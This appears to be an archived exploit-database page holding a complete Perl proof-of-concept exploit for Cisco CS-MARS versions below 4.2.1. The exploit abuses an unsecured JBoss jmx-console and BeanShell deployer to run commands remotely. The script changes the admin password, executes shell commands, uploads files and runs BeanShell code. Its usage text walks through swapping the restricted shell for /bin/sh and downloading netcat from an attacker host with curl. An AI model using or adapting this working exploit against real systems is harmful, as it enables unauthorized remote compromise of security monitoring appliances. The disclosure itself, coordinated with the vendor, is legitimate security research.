<html><head><title>Cisco/Protego CS-MARS < 4.2.1 (JBoss) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
# 
# Cisco/Protego CS-MARS &lt; 4.2.1 remote command execution, system compromise
# via insecure JBoss installation.
#
# Fully functional POC code by Jon Hart &lt;jhart@spoofed.org&gt;
#
# Addressed in CSCse47646
#
# CS-MARS is an event correlation product orginally written by Protego,
# which is now owned by Cisco.  It is built on top of JBoss.
# Unfortunately, little or no effort was put in to securing the JBoss
# installation as per the JBoss community's recommended best practices.
# A such, the usual set of JBoss interfaces are wide open and it is up to
# the attacker how creative they want to be in compromising the box.  This
# particular exploit vector abuses the JBoss jmx-console for all sorts of
# fun.  It should also be noted that, because of the very old kernel
# running on most CS-MARS boxes (2.4.9), once JBoss is compromised, root is
# almost trivial.  Thanks to Cisco PSIRT and Matt Cerha for their
# cooperation in getting this fixed.
#
#################################
#  Copyright (C) 2006 Jon Hart
#
#  This program is free software; you can redistribute it and/or modify it
#  under the terms of the GNU General Public License as published by the Free
#  Software Foundation; either version 2 of the License, or (at your option)
#  any later version.
#
#  This program is distributed in the hope that it will be useful, but WITHOUT
#  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
#  FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
#  more details.
#
#  You should have received a copy of the GNU General Public License along with
#  this program; if not, write to the Free Software Foundation, Inc., 59 Temple
#  Place, Suite 330, Boston, MA 02111-1307 USA
#
#
#################################
#

use strict;
use HTTP::Request::Common;
use LWP::UserAgent;
use IO::Socket;

my $target = shift(@ARGV) || &amp;usage;
my $attack_type = shift(@ARGV) || &amp;usage; 

for ($attack_type) {
   if    (/pass/) { &amp;change_passwd(@ARGV); }
   elsif (/cmd/) { &amp;run_cmd(@ARGV); }
   elsif (/upload/) { &amp;upload(@ARGV); }
   elsif (/[bean|bsh]/) { &amp;run_bsh(@ARGV); }
   else { &amp;usage; }
} 

sub change_passwd {
   my $passwd = shift;
   &amp;run_cmd(&quot;/opt/janus/release/bin/pnpasswd $passwd&quot;);
}

sub encode {
   my $en = shift;
   my $string = &quot;&quot;;
   foreach my $char (split(//, $en)) {
      if ($char =~ /([:|\/|(|)|&quot;|'|`| ])/) {
         $string .= sprintf(&quot;%%%x&quot;, ord($1));
      } else { $string .= $char; }
   }
   return $string;
}

sub jmx_post {
   my $form_data = shift; 
   my $ua = LWP::UserAgent-&gt;new;
   $ua-&gt;agent(&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&quot;);
   my $req = HTTP::Request-&gt;new(POST =&gt; &quot;http://$target/jmx-console/HtmlAdaptor&quot;);
   $req-&gt;content_type('application/x-www-form-urlencoded');
   $req-&gt;content(&amp;encode($form_data));

   my $res = $ua-&gt;request($req);

   return $res-&gt;is_success ? 0 : $res-&gt;status_line;
}

sub run_bsh {
   my $file = shift;
   my $bsh = &quot;&quot;;
   open(BSH, &quot;$file&quot;) or die &quot;Couldn't open $file: $!\n&quot;;
   print(&quot;Sending beanshell from $file: &quot;);
   while (&lt;BSH&gt;) {
      # the bsh must be one long string...
      chomp();
      $bsh .= $_;
   }
   
   printf(&quot;%s\n&quot;, &amp;send_beanshell($bsh) == 0 ? &quot;Success&quot; : &quot;Failed&quot;);
}

sub run_cmd {
   my $cmd = shift; 
   my $code = &quot;&quot;;
  
   # &amp; in the command needs to be encoded so as to not be confused with the &amp;
   # in the URI
   $cmd =~ s/&amp;/%26/g;
   if ($cmd =~ /&gt;|\||&amp;/) {
      # exec() does not handle pipes or redirection well, so do this instead
      $code = 'String sh = &quot;/bin/sh&quot;; String opt = &quot;-c&quot;; String cmd = &quot;'
            . $cmd .
            '&quot;; String[] exec = new String[] { sh, opt, cmd }; Runtime.getRuntime().exec(exec);';
   } else {
      $code = &quot;Runtime.getRuntime().exec(\&quot;$cmd\&quot;);&quot;;
   }

   print(&quot;Running '$cmd' on $target: &quot;);
   printf(&quot;%s\n&quot;, &amp;send_beanshell($code) == 0 ? &quot;Success&quot; : &quot;Failed!&quot;);
}

sub send_beanshell {
   my $code = shift;
   # ensure the name of the bsh job within java has a unique name
   my $name = &quot;cmd&quot; . int(rand(65535)) . $$;
   return &amp;jmx_post(&quot;action=invokeOp&amp;name=jboss.scripts:service=BSHDeployer&amp;methodIndex=1&amp;arg0=$code&amp;arg1=$name&quot;);
}

sub upload {
   # upload a file.  I was too lazy to use org.jboss.console.manager.DeploymentFileRepository
   my $file = shift;
   my $path = shift;
   my $new_name = shift;
   my $chunk = &quot;&quot;;
   my $ret = 0;
   open(FILE, &quot;&lt; $file&quot;) or die &quot;Couldn't open $file for reading: $!\n&quot;;

   if (!(defined($new_name))) {
      my @path = split(/\//, $file);
      $new_name = $path[$#path];
   }

   print(&quot;Uploading $file to $target...\n&quot;);
   &amp;run_cmd(&quot;touch $path/$new_name&quot;);
   while(read(FILE,$chunk,4096)) {
      # encode this file in 4096 byte chunks in a format that is able to be handled by JBoss.
      # There are plenty of ways to do this, but none that were both portable and that didn't make JBoss 
      # throw a 500 or otherwise botch the file.  UGLY.
      $chunk = join('', map { sprintf(&quot;%03d,&quot;, ord(&quot;$_&quot;)) } split(//, $chunk));
      $ret += &amp;run_cmd(&quot;echo -n $chunk | perl -ne 'foreach (split(/,/, \$_)) { print chr(\$_); }' &gt;&gt; $path/$new_name&quot;);
   }

   printf(&quot;Upload of $file to $target:$path/new_name %s!\n&quot;, $ret == 0 ? &quot;succeeded&quot; : &quot;failed&quot;);
}


sub usage {
   print &lt;&lt;EOF;
   Cisco MARS (CS-MARS) &lt; 4.2.1 JBoss exploit (CSCse47646) POC by Jon Hart &lt;jhart\@spoofed.org&gt;

   Basic Usage:
      $0 &lt;target&gt; &lt;exploit_type&gt; [&lt;exploit_specific_args] ...]

   Extended Usage:
      Change password:
      $0 &lt;target&gt; pass &lt;password&gt;
      Run shell command:
      $0 &lt;target&gt; cmd &lt;your quoted shell command&gt;
      Run BeanShell code:
      $0 &lt;target&gt; bsh /path/to/file/with/beanshell
      Upload files:
      $0 &lt;target&gt; upload &lt;file to upload&gt; &lt;path on target&gt; [&lt;new name&gt;]

      Fun Stuff:
         Get a real shell:
         $0 &lt;target&gt; cmd &quot;cp /opt/janus/release/bin/pnsh /opt/janus/release/bin/pnsh.bak&quot;
         $0 &lt;target&gt; cmd &quot;rm  /opt/janus/release/bin/pnsh&quot;
         $0 &lt;target&gt; cmd &quot;cp /bin/sh /opt/janus/release/bin/pnsh&quot;
         # now ssh to the target...
         [pnadmin\@pnmars bin]\$ id
         uid=501(pnadmin) gid=501(pnadmin) groups=501(pnadmin)
         [pnadmin\@pnmars bin]\$ uname -a
         Linux pnmars 2.4.9-e.57 #1 Thu Dec 2 20:56:19 EST 2004 i686 unknown
         [pnadmin\@pnmars bin]\$ hostname
         pnmars
         
         Download something:
         $0 &lt;target&gt; cmd &quot;curl http://yourhost/nc -o /tmp/nc&quot;

EOF
exit(1);
}

# milw0rm.com [2006-07-20]</pre></html>